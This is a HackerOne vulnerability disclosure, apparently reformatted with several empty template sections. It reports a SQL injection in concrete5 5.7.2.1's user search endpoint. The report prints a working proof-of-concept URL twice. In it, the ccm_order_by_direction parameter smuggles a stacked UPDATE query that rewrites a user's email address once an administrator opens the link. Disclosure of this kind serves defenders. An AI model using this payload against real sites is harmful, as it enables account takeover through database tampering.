# SQL injection in conc/index.php/ccm/system/search/users/submit

## Metadata
- **Source:** HackerOne
- **Report:** 38778 | https://hackerone.com/reports/38778
- **Submitted:** 2014-12-09
- **Reporter:** yujitounai
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** SQL Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
Hello.
I found SQL injection in conc/index.php/ccm/system/search/users/submit

PoC is below

When User login as Administrator
the user open this link

http://172.20.0.49/conc/index.php/ccm/system/search/users/submit?&ccm_order_by=u.uEmail&ccm_order_by_direction=desc;UPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202;--

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello.
I found SQL injection in conc/index.php/ccm/system/search/users/submit

PoC is below

When User login as Administrator
the user open this link

http://172.20.0.49/conc/index.php/ccm/system/search/users/submit?&ccm_order_by=u.uEmail&ccm_order_by_direction=desc;UPDATE%20%60conc501%60.%60Users%60%20SET%20%60uEmail%60%20=%20%27user@evilhost%27%20WHERE%20%60users%60.%60uID%60%20=%202;--

and update user's email address.
and I think I can do various things ;)

I tested to work concrete5 5.7.2.1 on Apache(using ammps) Windows8


</details>

---
*Analysed by Claude on 2026-05-24*
